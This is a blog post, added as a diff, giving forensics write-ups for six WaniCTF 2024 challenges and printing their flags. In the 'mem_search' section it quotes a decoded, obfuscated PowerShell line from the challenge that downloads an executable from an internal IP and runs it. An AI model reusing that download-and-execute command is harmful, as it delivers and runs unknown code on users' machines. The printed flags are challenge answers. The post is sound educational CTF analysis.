@@ -1,0 +1,162 @@
+---
+title: WaniCTF
+tags: [Forensics]
+layout: post
+date:   2024-08-12 00:00:00
+excerpt: "WanCTFs 2024"
+feature: https://raw.githubusercontent.com/raviyelna/raviyelna.github.io/master/assets/img/background.jpg
+categories: CTFs
+---
+
+# WaniCTF
+All the challenges: https://drive.google.com/drive/folders/1n-0bDNWddJO4AJDAYqCwFduhcAZgcK61?usp=sharing
+
+---
+## Tiny_usb
+### Beginner
+
+![image](https://hackmd.io/_uploads/SyY35WBIC.png)
+
+The challenge gave us a iso file, just extract it and you will get a flag.
+
+![FLAG](https://hackmd.io/_uploads/HJqQ5-HIR.png)
+
+---
+## Surveillance_of_sus
+### Normal
+![image](https://hackmd.io/_uploads/SJNCcbSI0.png)
+
+The challenge gave us a bin file so I will strings it out first
+
+![image](https://hackmd.io/_uploads/S1Jd2bH8C.png)
+I found out that its a RDP8Bmp so I will be using this **[tool](https://github.com/ANSSI-FR/bmc-tools)** to extract it https://github.com/ANSSI-FR/bmc-tools
+
+![image](https://hackmd.io/_uploads/Hk4UR-BIR.png)
+
+![image](https://hackmd.io/_uploads/ByyqCbS8R.png)
+and you will get the flag.
+
+![image](https://hackmd.io/_uploads/H1OeyGrI0.png)
+You can try to fix it by yourself or just guess the word and submit it.
+
+---
+## tiny_10px
+### Normal
+
+![image](https://hackmd.io/_uploads/ryDm7GB80.png)
+The challenge gave us a small picture
+
+![chal_tiny_10px](https://hackmd.io/_uploads/B1Y6QMHU0.jpg)  **<--------------this is the image lol**
+
+Based on the name of the challenge  "Tiny_10px" and size, how can this tiny piece of image can be over 44kbs?
+
+![image](https://hackmd.io/_uploads/rJzsEzrIR.png) 
+
+So its must be Height and Widgth Steganography and its a JPG
+
+![image](https://hackmd.io/_uploads/ByLHHzBL0.png)
+
+Do it by yourself by modifying the Hex bytes!
+You may get this kind of result: 
+
+![8](https://hackmd.io/_uploads/S10IIGB8R.jpg)
+you can you editor or paint to get the flag, anyway here is the final flag 
+
+![fixed](https://hackmd.io/_uploads/ryn4YMr8C.jpg)
+
+---
+## mem_search
+### Hard
+![image](https://hackmd.io/_uploads/rkPbiGS8R.png)
+
+The challenge gave us a DUMP file, so I will be using volatility to solve this, its also told us that the user found an unknown file so I will be checking the download folder first.
+
+![image](https://hackmd.io/_uploads/Sk3z2GSLR.png)
+
+after checking the download I found there a suspicous file thats is "**read_this_as_admin.download**" so I dump it right away
+![image](https://hackmd.io/_uploads/BJSLaMH80.png)
+
+The file connect the user to a website and download a file, so I will search for that file then read it again.
+
+![image](https://hackmd.io/_uploads/HJBC6MSUC.png)
+![image](https://hackmd.io/_uploads/BkbfCzHL0.png)
+
+The file seem to be executing a powershell script after decode the string here the result:
+
+```
+$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ==/chall_mem_s'+'.arch.e'+'.xe';$t='Wan'+'iT'+'.mkdir -force $env:TMP\\.$t;try{iwgr -OutFile $d\\msedg.exe;& $d\\msedg.exe;}catch{}
+
+```
+
+URL: **http://192.168.0.16:8282/B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ==/chall_mem_search.exe**
+Assigns the directory $env:TMP\\WanIT
+Its attempts to download the file **msedge.exe** from the URL into the directory and then executes it.
+so we know the malware name, its **"msedge.exe"** so I need search then dump it out.
+
+![image](https://hackmd.io/_uploads/B18L1QH80.png)
+
+throw it in [TotalVirus](https://www.virustotal.com/gui/home/upload), here the result:
+
+![image](https://hackmd.io/_uploads/SkFjkmSIA.png)
+
+**Its reversing time!**
+
+![image](https://hackmd.io/_uploads/BkHyGQB8A.png)
+
+The first thing that catch my eye is the fake flag lol
+FLAG{Hacked_yikes_spooky}
+Anyway after analyze the whole malware its lead me to nothing so we need to take a step back to look for more clue then I notice something weird with the link
+
+**`B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ==`**
+why does it has the part "B64_decode_....", then I tried decode the latter part and got the Flag:
+### **FLAG{Dayum_this_is_secret_file}**
+
+
+---
+## I_wanna_be_a_streamer
+### Normal
+
+![image](https://hackmd.io/_uploads/BJ5TmoSU0.png)
+
+The challenge gave us a pcap file
+
+![image](https://hackmd.io/_uploads/SJfFEoBUC.png)
+ 
+As you can see in the rex box, the user connect to a Camera using RTP protocol
+
+![image](https://hackmd.io/_uploads/SJ50NirUR.png)
+ 
+after reading tons and tons of articles about RTP protocol
+ 
+![image](https://hackmd.io/_uploads/SyIzBoHLR.png)
+
+I finally found a way to solve this challenge
+ 
+*  First install this plugin for your wireshark 
+ **------>https://github.com/volvet/h264extractor<------**
+*  open wireshark > Analyze > Decode as > add > RTP ( or RTP payload smth) > Edit > Preferences > Protocol > H.264 (type == 96) > Menu > Tools > Extract h264 stream from RTP
+*  ffmpeg -i file_extracted -c copy flag.mp4
+ 
+![image](https://hackmd.io/_uploads/ByGMPiSL0.png)
+
+---
+## Codebreaker
+### Beginner (I hate this chall)
+
+![image](https://hackmd.io/_uploads/H11vOiSLC.png)
+
+the chall gave us a qrcode but got broken
+
+![chal_codebreaker](https://hackmd.io/_uploads/SyK9_oHUC.png)
+
+Just like one of the challenge that I already done 
+------>https://hackmd.io/v3qpKEIWT1-aZbWrkaS2Ig (sr I wrote it in Vietnamese)
+I reconstructed the Qrcode by replacing the 3 corner first
+
+![image](https://hackmd.io/_uploads/ByCMKirUC.png)
+
+then I got the flag lmao, I got bad luck cause I have done a lots when I say a lots I really mean it, it cost me hours.
+### FLAG{How_scan-dalous}
+
+![image](https://hackmd.io/_uploads/SJwjKjBLR.png)
+Okay Mikka thanks for the challs anyway whats a fun CTFs to play
